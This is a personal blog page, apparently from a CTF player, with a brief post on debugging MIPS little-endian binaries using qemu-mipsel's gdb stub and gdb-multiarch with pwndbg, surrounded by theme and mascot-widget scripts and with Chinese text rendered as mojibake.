<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="Grideaé™æ€ä¸ªäººåšå®¢">
<meta name="description" content="ä¸–é—´ä¸‡èˆ¬å…µåˆƒï¼Œå”¯æœ‰è¿‡å¾€ä¼¤äººæœ€æ·±">
<meta name="theme-color" content="#000">
<title>mipså¼‚æ¶æ„è°ƒè¯• | L1u66&#39;s blog</title>
<link rel="shortcut icon" href="/favicon.ico?v=1734449472245">
<link rel="stylesheet" href="/media/css/gemini.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.loli.net/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/default.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script src="/media/js/jquery.js"></script>
<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>






  <meta name="description" content="mipså¼‚æ¶æ„è°ƒè¯•" />
  <meta name="keywords" content="" />
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="gemini">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>L1u66&#39;s blog</span>
            </a>  
          
        </div>
        
          <p class="subtitle">ä¸–é—´ä¸‡èˆ¬å…µåˆƒï¼Œå”¯æœ‰è¿‡å¾€ä¼¤äººæœ€æ·±</p>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-globe"></i> é¦–é¡µ
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/archives" target="_self">
                  <i class="fa fa-globe"></i> å½’æ¡£
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tags" target="_self">
                  <i class="fa fa-globe"></i> æ ‡ç­¾
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/post/about" target="_self">
                  <i class="fa fa-globe"></i> å…³äº
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> å‹é“¾
                  
                </a>
              </li>
            
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">æœç´¢</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout gemini ">
      <div class="section-layout-wrapper">
        

<div class="sidebar">
  
    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
      
        <div class="post-list-sidebar">
          <div class="sidebar-title">
            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active language" data-lan="index">æ–‡ç« ç›®å½•</span>
            <span id="metaSideBar" class="sidebar-title-item language" data-lan="preview">ç«™ç‚¹æ¦‚è§ˆ</span>
          </div>
        </div>
      
      <div class="sidebar-body gemini" id="sidebar_body">
        
          
            
<div class="sidebar-wrapper box-shadow-wrapper bg-color">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">L1u66</p>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">56</span>
        <span class="site-item-stat-name language" data-lan="article">æ–‡ç« </span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">25</span>
        <span class="site-item-stat-name language" data-lan="tag">æ ‡ç­¾</span>
      </a>
    </div>
  </div>
  
    
  
  



  <div style="width: 100%; position: relative;">
    <canvas id="canvasDiyBlock" style="width:100%;">å½“å‰æµè§ˆå™¨ä¸æ”¯æŒcanvasï¼Œè¯·æ›´æ¢æµè§ˆå™¨åå†è¯•</canvas>
    <script src="/media/js/magic/clock.js"></script>
  </div>

</div>
          
        
      </div>
    </div>
  
</div>
<script>
  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
  const SLIDE_UP_IN = 'slide-up-in';

  let sidebar = document.querySelector('#sidebar'),
  tocSideBar = document.querySelector('#tocSideBar'),
  metaSideBar = document.querySelector('#metaSideBar'),
  postToc = document.querySelector('#post_toc'),
  postSiteMeta = document.querySelector('#post_side_meta'),
  sidebarTitle = document.querySelector('.sidebar-title'),
  sidebarBody = document.querySelector('#sidebar_body');

  tocSideBar && tocSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  metaSideBar && metaSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  function toggleSidebar(e) {
    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
    if (currentTitle == e.srcElement) {
      return ;
    }
    let current, showElement, hideElement;
    if (e.srcElement == metaSideBar) {
      showElement = postSiteMeta;
      hideElement = postToc;
    } else if (e.srcElement == tocSideBar){
      showElement = postToc;
      hideElement = postSiteMeta;
    }
    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);

    jQuery.Velocity(hideElement, 'stop');
    jQuery.Velocity(hideElement, 'transition.slideUpOut', {
      display: 'none',
      duration: 200,
      complete: function () {
        jQuery.Velocity(showElement, 'transition.slideDownIn', {
          duration: 200
        });
      }
    })
    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
  }

  postToc && postToc.addEventListener('transitionend', function() {
    this.classList.remove(SLIDE_UP_IN);
  });

  if (sidebarBody) {
    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
      let hasFix = false;
      let scrollEl = document.querySelector('.main-continer');
      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
      window.addEventListener('scroll', function(e) {
        if (document.scrollingElement.scrollTop >= limitTop) {
          if (!hasFix) {
            sidebar.classList.add('sidebar-fixed');
            hasFix = true;
          }
        } else {
          if (hasFix) {
            sidebar.classList.remove('sidebar-fixed');
            hasFix = false;
          }
        }
      });
    }
  }
  
</script>
        <div class="section-box box-shadow-wrapper">
          <div class="section bg-color post post-page">
            <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://l1u66.github.io/post/mips-yi-jia-gou-diao-shi/"> mipså¼‚æ¶æ„è°ƒè¯• </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2024-08-15 23:35:09">2024-08-15</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >1<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >67<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

            <div class="post-body next-md-body" id="post_body">
              <p>gdb-multiarchå®‰è£…<br>
<code>sudo apt-get install gdb-multiarch</code><br>
å¼€ç»ˆç«¯</p>
<pre><code>qemu-mipsel -g 1234 ./subcall_stack
æˆ–
qemu-mipsel -g 1234 -L mipsel-linux-gnu ./subcall_stack			# -L æŒ‡å®šåŠ¨æ€åº“
</code></pre>
<p>å¦èµ·ç»ˆç«¯<br>
è¿›å…¥gdb-multiarchè°ƒè¯•ï¼ˆpwndbgï¼‰</p>
<pre><code>$ gdb-multiarch ./subcall_stack
pwndbg&gt; set architecture mips
The target architecture is assumed to be mips
pwndbg&gt; target remote localhost:1234
</code></pre>

            </div>
            
              <div class="reward-btn">
                <div class="reward-btn-text">èµèµ</div>
              </div>
            
            
              <div class="post-footer">
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong class="language" data-lan="author">æœ¬æ–‡ä½œè€…ï¼š</strong>
      L1u66
    </li>
    <li class="post-copyright-link">
      <strong class="language" data-lan="link">æœ¬æ–‡é“¾æ¥ï¼š</strong>
      <a href="https://l1u66.github.io/post/mips-yi-jia-gou-diao-shi/" title="mipså¼‚æ¶æ„è°ƒè¯•">https://l1u66.github.io/post/mips-yi-jia-gou-diao-shi/</a>
    </li>
    <li class="post-copyright-license">
      <strong class="language" data-lan="copyright">ç‰ˆæƒå£°æ˜ï¼š </strong>
      æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
    </li>
  </ul>
  <div class="tags">
    
  </div>
  <div class="nav">
    <div class="nav-prev">
      
        <i class="fa fa-chevron-left"></i>
        <a class="nav-pc-next" title="ç¾ŠåŸæ¯2024" href="https://l1u66.github.io/post/yang-cheng-bei-2024/">ç¾ŠåŸæ¯2024</a class="nav-pc-next">
        <a class="nav-mobile-prev" title="ç¾ŠåŸæ¯2024" href="https://l1u66.github.io/post/yang-cheng-bei-2024/">ä¸Šä¸€ç¯‡</a>
      
    </div>
    <div class="nav-next">
      
        <a class="nav-pc-next" title="TFCCTF2024" href="https://l1u66.github.io/post/tfcctf2024/">TFCCTF2024</a>
        <a class="nav-mobile-next" title="TFCCTF2024" href="https://l1u66.github.io/post/tfcctf2024/">ä¸‹ä¸€ç¯‡</a>
        <i class="fa fa-chevron-right"></i>
      
    </div>
  </div>
</div>
            
            
  

          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <center id="runTimeBox">
      å·²è¿è¡Œ:<span id="run_time"></span>
    </center>
    <span id="busuanzi_container_site_pv">æµè§ˆæ•°:<span id="busuanzi_value_site_pv"></span> æ¬¡</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">è®¿å®¢æ•°:<span id="busuanzi_value_site_uv"></span> äºº</span>

    <script>
      BirthDay = new Date('');
      if (BirthDay.getTime()) {
        function runTime() {
          str = "";
          today = new Date();
          timeold = today.getTime() - BirthDay.getTime();
          msPerDay = 24 * 60 * 60 * 1000;
          e_daysold = timeold / msPerDay;
          daysold = Math.floor(e_daysold);
          str += daysold + "å¤©";
          return str;
        }
        setInterval(function () {
          $("#run_time").html(runTime());
        }, 1000);
      } else {
        document.querySelector('.footer').removeChild(document.querySelector('#runTimeBox'));
      }
    </script>
    <div class="poweredby">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
    </div>
  </footer>
  
    
        <div class="gemini back-to-top" id="back_to_top">
          <i class="fa fa-arrow-up"></i>
          
            <span class="scrollpercent"> <span id="back_to_top_text">0</span>% </span>
            
        </div>
        
          
            
              <div class="bg-img">
                <img src="\media\images\custom-bgImg.jpg" />
              </div>
              
                
                  
                    
<link rel="stylesheet" href="/media/live2d/css/live2d.css" />
<div class="box-scale">
  <div id="landlord" style="left: 5px;bottom: px;"
    data-key="">
    <canvas id="live2d" width="500" height="560" class="live2d"></canvas>
    

      <div class="message" style="opacity:0"></div>
      <div class="live_talk_input_body">
        <div class="live_talk_input_name_body">
          <input name="name" type="text" class="live_talk_name white_input" id="AIuserName" autocomplete="off"
            placeholder="ä½ çš„åå­—" />
        </div>
        <div class="live_talk_input_text_body">
          <input name="talk" type="text" class="live_talk_talk white_input" id="AIuserText" autocomplete="off"
            placeholder="è¦å’Œæˆ‘èŠä»€ä¹ˆå‘€ï¼Ÿ" />
          <button type="button" class="live_talk_send_btn" id="talk_send">å‘é€</button>
        </div>
      </div>
      <input name="live_talk" id="live_talk" value="1" type="hidden" />
      <div class="live_ico_box">
        <div class="live_ico_item type_info" id="showInfoBtn"></div>
        <div class="live_ico_item type_talk" id="showTalkBtn"></div>
        
        <div class="live_ico_item type_youdu" id="youduButton"></div>
        <div class="live_ico_item type_quit" id="hideButton"></div>
        <input name="live_statu_val" id="live_statu_val" value="0" type="hidden" />
        <audio src="" style="display:none;" id="live2d_bgm" data-bgm="0" preload="none"></audio>
        <input id="duType" value="douqilai" type="hidden">
        
      </div>
    
  </div>
</div>
<div id="open_live2d">å¬å”¤çœ‹æ¿å¨˜</div>
<script>
  var message_Path = 'https://cdn.jsdelivr.net/gh/hsxyhao/live2d.github.io@master/';
  let landlord = document.querySelector('#landlord');
  var apiKey = landlord.dataset.key;
</script>
<script type="text/javascript" src="/media/live2d/js/live2d.js"></script>
<script>
	var home_Path = document.location.protocol + '//' + window.document.location.hostname + ":" + window.document.location.port + '/';
	var userAgent = window.navigator.userAgent.toLowerCase();
	var norunAI = ["android", "iphone", "ipod", "ipad", "windows phone", "mqqbrowser", "msie", "trident/7.0"];
	var norunFlag = false;

	for (var i = 0; i < norunAI.length; i++) {
		if (userAgent.indexOf(norunAI[i]) > -1) {
			norunFlag = true;
			break;
		}
	}

	if (!window.WebGLRenderingContext) {
		norunFlag = true;
	}

	if (!norunFlag) {
		var hitFlag = false;
		var AIFadeFlag = false;
		var liveTlakTimer = null;
		var sleepTimer_ = null;
		var AITalkFlag = false;
		var talkNum = 0;
		(function () {
			function renderTip(template, context) {
				var tokenReg = /(\\)?\{([^\{\}\\]+)(\\)?\}/g;
				return template.replace(tokenReg, function (word, slash1, token, slash2) {
					if (slash1 || slash2) {
						return word.replace('\\', '');
					}
					var variables = token.replace(/\s/g, '').split('.');
					var currentObject = context;
					var i, length, variable;
					for (i = 0, length = variables.length; i < length; ++i) {
						variable = variables[i];
						currentObject = currentObject[variable];
						if (currentObject === undefined || currentObject === null) return '';
					}
					return currentObject;
				});
			}

			String.prototype.renderTip = function (context) {
				return renderTip(this, context);
			};

			var re = /x/;
			re.toString = function () {
				showMessage('å“ˆå“ˆï¼Œä½ æ‰“å¼€äº†æ§åˆ¶å°ï¼Œæ˜¯æƒ³è¦çœ‹çœ‹æˆ‘çš„ç§˜å¯†å—ï¼Ÿ', 5000);
				return '';
			};

			$(document).on('copy', function () {
				showMessage('ä½ éƒ½å¤åˆ¶äº†äº›ä»€ä¹ˆå‘€ï¼Œè½¬è½½è¦è®°å¾—åŠ ä¸Šå‡ºå¤„å“¦~~', 5000);
			});

			function initTips() {
				$.ajax({
					cache: true,
					url: message_Path + 'message.json',
					dataType: "json",
					success: function (result) {
						$.each(result.mouseover, function (index, tips) {
							$(tips.selector).mouseover(function () {
								var text = tips.text;
								if (Array.isArray(tips.text)) text = tips.text[Math.floor(Math.random() * tips.text.length + 1) - 1];
								text = text.renderTip({ text: $(this).text() });
								showMessage(text, 3000);
								talkValTimer();
								clearInterval(liveTlakTimer);
								liveTlakTimer = null;
							});
							$(tips.selector).mouseout(function () {
								showHitokoto();
								if (liveTlakTimer == null) {
									liveTlakTimer = window.setInterval(function () {
										showHitokoto();
									}, 15000);
								};
							});
						});
						$.each(result.click, function (index, tips) {
							$(tips.selector).click(function () {
								if (hitFlag) {
									return false
								}
								hitFlag = true;
								setTimeout(function () {
									hitFlag = false;
								}, 8000);
								var text = tips.text;
								if (Array.isArray(tips.text)) text = tips.text[Math.floor(Math.random() * tips.text.length + 1) - 1];
								text = text.renderTip({ text: $(this).text() });
								showMessage(text, 3000);
							});
							clearInterval(liveTlakTimer);
							liveTlakTimer = null;
							if (liveTlakTimer == null) {
								liveTlakTimer = window.setInterval(function () {
									showHitokoto();
								}, 15000);
							};
						});
					}
				});
			}
			initTips();

			var text;
			if (document.referrer !== '') {
				var referrer = document.createElement('a');
				referrer.href = document.referrer;
				text = 'å—¨ï¼æ¥è‡ª <span style="color:#0099cc;">' + referrer.hostname + '</span> çš„æœ‹å‹ï¼';
				var domain = referrer.hostname.split('.')[1];
				if (domain == 'baidu') {
					text = 'å—¨ï¼ æ¥è‡ª ç™¾åº¦æœç´¢ çš„æœ‹å‹ï¼<br>æ¬¢è¿è®¿é—®<span style="color:#0099cc;">ã€Œ ' + document.title.split(' - ')[0] + ' ã€</span>';
				} else if (domain == 'so') {
					text = 'å—¨ï¼ æ¥è‡ª 360æœç´¢ çš„æœ‹å‹ï¼<br>æ¬¢è¿è®¿é—®<span style="color:#0099cc;">ã€Œ ' + document.title.split(' - ')[0] + ' ã€</span>';
				} else if (domain == 'google') {
					text = 'å—¨ï¼ æ¥è‡ª è°·æ­Œæœç´¢ çš„æœ‹å‹ï¼<br>æ¬¢è¿è®¿é—®<span style="color:#0099cc;">ã€Œ ' + document.title.split(' - ')[0] + ' ã€</span>';
				}
			} else {
				if (window.location.href == home_Path) { //ä¸»é¡µURLåˆ¤æ–­ï¼Œéœ€è¦æ–œæ ç»“å°¾
					var now = (new Date()).getHours();
					if (now > 23 || now <= 5) {
						text = 'ä½ æ˜¯å¤œçŒ«å­å‘€ï¼Ÿè¿™ä¹ˆæ™šè¿˜ä¸ç¡è§‰ï¼Œæ˜å¤©èµ·çš„æ¥å˜›ï¼Ÿ';
					} else if (now > 5 && now <= 7) {
						text = 'æ—©ä¸Šå¥½ï¼ä¸€æ—¥ä¹‹è®¡åœ¨äºæ™¨ï¼Œç¾å¥½çš„ä¸€å¤©å°±è¦å¼€å§‹äº†ï¼';
					} else if (now > 7 && now <= 11) {
						text = 'ä¸Šåˆå¥½ï¼å·¥ä½œé¡ºåˆ©å˜›ï¼Œä¸è¦ä¹…åï¼Œå¤šèµ·æ¥èµ°åŠ¨èµ°åŠ¨å“¦ï¼';
					} else if (now > 11 && now <= 14) {
						text = 'ä¸­åˆäº†ï¼Œå·¥ä½œäº†ä¸€ä¸ªä¸Šåˆï¼Œç°åœ¨æ˜¯åˆé¤æ—¶é—´ï¼';
					} else if (now > 14 && now <= 17) {
						text = 'åˆåå¾ˆå®¹æ˜“çŠ¯å›°å‘¢ï¼Œä»Šå¤©çš„è¿åŠ¨ç›®æ ‡å®Œæˆäº†å—ï¼Ÿ';
					} else if (now > 17 && now <= 19) {
						text = 'å‚æ™šäº†ï¼çª—å¤–å¤•é˜³çš„æ™¯è‰²å¾ˆç¾ä¸½å‘¢ï¼Œæœ€ç¾ä¸è¿‡å¤•é˜³çº¢~~';
					} else if (now > 19 && now <= 21) {
						text = 'æ™šä¸Šå¥½ï¼Œä»Šå¤©è¿‡å¾—æ€ä¹ˆæ ·ï¼Ÿ';
					} else if (now > 21 && now <= 23) {
						text = 'å·²ç»è¿™ä¹ˆæ™šäº†å‘€ï¼Œæ—©ç‚¹ä¼‘æ¯å§ï¼Œæ™šå®‰~~';
					} else {
						text = 'å—¨~ å¿«æ¥é€—æˆ‘ç©å§ï¼';
					}
				} else {
					text = 'æ¬¢è¿é˜…è¯»<span style="color:#0099cc;">ã€Œ ' + document.title.split(' - ')[0] + ' ã€</span>';
				}
			}
			showMessage(text, 12000);
		})();

		liveTlakTimer = setInterval(function () {
			showHitokoto();
		}, 15000);

		function showHitokoto() {
			if (sessionStorage.getItem("Sleepy") !== "1") {
				if (!AITalkFlag) {
					$.getJSON('https://v1.hitokoto.cn/', function (result) {
						talkValTimer();
						showMessage(result.hitokoto, 0);
					});
				}
			} else {
				hideMessage(0);
				if (sleepTimer_ == null) {
					sleepTimer_ = setInterval(function () {
						checkSleep();
					}, 200);
				}
			}
		}

		function checkSleep() {
			var sleepStatu = sessionStorage.getItem("Sleepy");
			if (sleepStatu !== '1') {
				talkValTimer();
				showMessage('ä½ å›æ¥å•¦~', 0);
				clearInterval(sleepTimer_);
				sleepTimer_ = null;
			}
		}

		function showMessage(text, timeout) {
			if (Array.isArray(text)) text = text[Math.floor(Math.random() * text.length + 1) - 1];
			$('.message').stop();
			$('.message').html(text);
			$('.message').fadeTo(200, 1);
			//if (timeout === null) timeout = 5000;
			//hideMessage(timeout);
		}
		function talkValTimer() {
			$('#live_talk').val('1');
		}

		function hideMessage(timeout) {
			//$('.message').stop().css('opacity',1);
			if (timeout === null) timeout = 5000;
			$('.message').delay(timeout).fadeTo(200, 0);
		}

		function initLive2d() {
			$('#hideButton').on('click', function () {
				if (AIFadeFlag) {
					return false;
				} else {
					AIFadeFlag = true;
					localStorage.setItem("live2dhidden", "0");
					$('#landlord').fadeOut(200);
					$('#open_live2d').delay(200).fadeIn(200);
					setTimeout(function () {
						AIFadeFlag = false;
					}, 300);
				}
			});
			$('#open_live2d').on('click', function () {
				if (AIFadeFlag) {
					return false;
				} else {
					AIFadeFlag = true;
					localStorage.setItem("live2dhidden", "1");
					$('#open_live2d').fadeOut(200);
					$('#landlord').delay(200).fadeIn(200);
					setTimeout(function () {
						AIFadeFlag = false;
					}, 300);
				}
			});
			$('#youduButton').on('click', function () {
				if ($('#youduButton').hasClass('doudong')) {
					var typeIs = $('#youduButton').attr('data-type');
					$('#youduButton').removeClass('doudong');
					$('body').removeClass(typeIs);
					$('#youduButton').attr('data-type', '');
				} else {
					var duType = $('#duType').val();
					var duArr = duType.split(",");
					var dataType = duArr[Math.floor(Math.random() * duArr.length)];

					$('#youduButton').addClass('doudong');
					$('#youduButton').attr('data-type', dataType);
					$('body').addClass(dataType);
				}
			});
			if (apiKey) {
				$('#showInfoBtn').on('click', function () {
					var live_statu = $('#live_statu_val').val();
					if (live_statu == "0") {
						return
					} else {
						$('#live_statu_val').val("0");
						$('.live_talk_input_body').fadeOut(500);
						AITalkFlag = false;
						showHitokoto();
						$('#showTalkBtn').show();
						$('#showInfoBtn').hide();
					}
				});
				$('#showTalkBtn').on('click', function () {
					var live_statu = $('#live_statu_val').val();
					if (live_statu == "1") {
						return
					} else {
						$('#live_statu_val').val("1");
						$('.live_talk_input_body').fadeIn(500);
						AITalkFlag = true;
						$('#showTalkBtn').hide();
						$('#showInfoBtn').show();

					}
				});
				$('#talk_send').on('click', function () {
					var info_ = $('#AIuserText').val();
					var userid_ = $('#AIuserName').val();
					if (info_ == "") {
						showMessage('å†™ç‚¹ä»€ä¹ˆå§ï¼', 0);
						return;
					}
					if (userid_ == "") {
						showMessage('èŠä¹‹å‰è¯·å‘Šè¯‰æˆ‘ä½ çš„åå­—å§ï¼', 0);
						return;
					}
					showMessage('æ€è€ƒä¸­~', 0);
					let protocol = window.location.protocol.indexOf("s") > 0 ? "https" : "http";
					$.ajax({
						type: "get",
						url: `${protocol}://www.tuling123.com/openapi/api?key=${apiKey}&info=${info_}`,
						dataType: "json",
						success: function (res) {
							talkValTimer();
							showMessage(res.text, 0);
							$('#AIuserText').val("");
							sessionStorage.setItem("live2duser", userid_);
						},
						error: function (e) {
							talkValTimer();
							showMessage('ä¼¼ä¹æœ‰ä»€ä¹ˆé”™è¯¯ï¼Œè¯·å’Œç«™é•¿è”ç³»ï¼', 0);
						}
					});
				});
			} else {
				$('#showInfoBtn').hide();
				$('#showTalkBtn').hide();
			}
			//è·å–éŸ³ä¹ä¿¡æ¯åˆå§‹åŒ–
			var bgmListInfo = $('input[name=live2dBGM]');
			if (bgmListInfo.length == 0) {
				$('#musicButton').hide();
			} else {
				var bgmPlayNow = parseInt($('#live2d_bgm').attr('data-bgm'));
				var bgmPlayTime = 0;
				var live2dBGM_Num = sessionStorage.getItem("live2dBGM_Num");
				var live2dBGM_PlayTime = sessionStorage.getItem("live2dBGM_PlayTime");
				if (live2dBGM_Num) {
					if (live2dBGM_Num <= $('input[name=live2dBGM]').length - 1) {
						bgmPlayNow = parseInt(live2dBGM_Num);
					}
				}
				if (live2dBGM_PlayTime) {
					bgmPlayTime = parseInt(live2dBGM_PlayTime);
				}
				var live2dBGMSrc = bgmListInfo.eq(bgmPlayNow).val();
				$('#live2d_bgm').attr('data-bgm', bgmPlayNow);
				$('#live2d_bgm').attr('src', live2dBGMSrc);
				$('#live2d_bgm')[0].currentTime = bgmPlayTime;
				$('#live2d_bgm')[0].volume = 0.5;
				var live2dBGM_IsPlay = sessionStorage.getItem("live2dBGM_IsPlay");
				var live2dBGM_WindowClose = sessionStorage.getItem("live2dBGM_WindowClose");
				if (live2dBGM_IsPlay == '0' && live2dBGM_WindowClose == '0') {
					$('#live2d_bgm')[0].play();
					$('#musicButton').addClass('play');
				}
				sessionStorage.setItem("live2dBGM_WindowClose", '1');
				$('#musicButton').on('click', function () {
					if ($('#musicButton').hasClass('play')) {
						$('#live2d_bgm')[0].pause();
						$('#musicButton').removeClass('play');
						sessionStorage.setItem("live2dBGM_IsPlay", '1');
					} else {
						$('#live2d_bgm')[0].play();
						$('#musicButton').addClass('play');
						sessionStorage.setItem("live2dBGM_IsPlay", '0');
					}
				});
				window.onbeforeunload = function () {
					sessionStorage.setItem("live2dBGM_WindowClose", '0');
					if ($('#musicButton').hasClass('play')) {
						sessionStorage.setItem("live2dBGM_IsPlay", '0');
					}
				}
				document.getElementById('live2d_bgm').addEventListener("timeupdate", function () {
					var live2dBgmPlayTimeNow = document.getElementById('live2d_bgm').currentTime;
					sessionStorage.setItem("live2dBGM_PlayTime", live2dBgmPlayTimeNow);
				});
				document.getElementById('live2d_bgm').addEventListener("ended", function () {
					var listNow = parseInt($('#live2d_bgm').attr('data-bgm'));
					listNow++;
					if (listNow > $('input[name=live2dBGM]').length - 1) {
						listNow = 0;
					}
					var listNewSrc = $('input[name=live2dBGM]').eq(listNow).val();
					sessionStorage.setItem("live2dBGM_Num", listNow);
					$('#live2d_bgm').attr('src', listNewSrc);
					$('#live2d_bgm')[0].play();
					$('#live2d_bgm').attr('data-bgm', listNow);
				});
				document.getElementById('live2d_bgm').addEventListener("error", function () {
					$('#live2d_bgm')[0].pause();
					$('#musicButton').removeClass('play');
					showMessage('éŸ³ä¹ä¼¼ä¹åŠ è½½ä¸å‡ºæ¥äº†å‘¢ï¼', 0);
				});
			}
			//è·å–ç”¨æˆ·å
			var live2dUser = sessionStorage.getItem("live2duser");
			if (live2dUser !== null) {
				$('#AIuserName').val(live2dUser);
			}
			//è·å–ä½ç½®
			var landL = sessionStorage.getItem("historywidth");
			var landB = sessionStorage.getItem("historyheight");
			if (landL == null || landB == null) {
				landL = '5px'
				landB = '0px'
			}
			$('#landlord').css('left', landL + 'px');
			$('#landlord').css('bottom', landB + 'px');
			//ç§»åŠ¨
			function getEvent() {
				return window.event || arguments.callee.caller.arguments[0];
			}
			var smcc = document.getElementById("landlord");
			var moveX = 0;
			var moveY = 0;
			var moveBottom = 0;
			var moveLeft = 0;
			var moveable = false;
			var docMouseMoveEvent = document.onmousemove;
			var docMouseUpEvent = document.onmouseup;
			smcc.onmousedown = function () {
				var ent = getEvent();
				moveable = true;
				moveX = ent.clientX;
				moveY = ent.clientY;
				var obj = smcc;
				moveBottom = parseInt(obj.style.bottom);
				moveLeft = parseInt(obj.style.left);
				if (isFirefox = navigator.userAgent.indexOf("Firefox") > 0) {
					window.getSelection().removeAllRanges();
				}
				document.onmousemove = function () {
					if (moveable) {
						var ent = getEvent();
						var x = moveLeft + ent.clientX - moveX;
						var y = moveBottom + (moveY - ent.clientY);
						obj.style.left = x + "px";
						obj.style.bottom = y + "px";
					}
				};
				document.onmouseup = function () {
					if (moveable) {
						var historywidth = obj.style.left;
						var historyheight = obj.style.bottom;
						historywidth = historywidth.replace('px', '');
						historyheight = historyheight.replace('px', '');
						sessionStorage.setItem("historywidth", historywidth);
						sessionStorage.setItem("historyheight", historyheight);
						document.onmousemove = docMouseMoveEvent;
						document.onmouseup = docMouseUpEvent;
						moveable = false;
						moveX = 0;
						moveY = 0;
						moveBottom = 0;
						moveLeft = 0;
					}
				};
			};
		}
		$(document).ready(function () {
			var AIimgSrc = [];
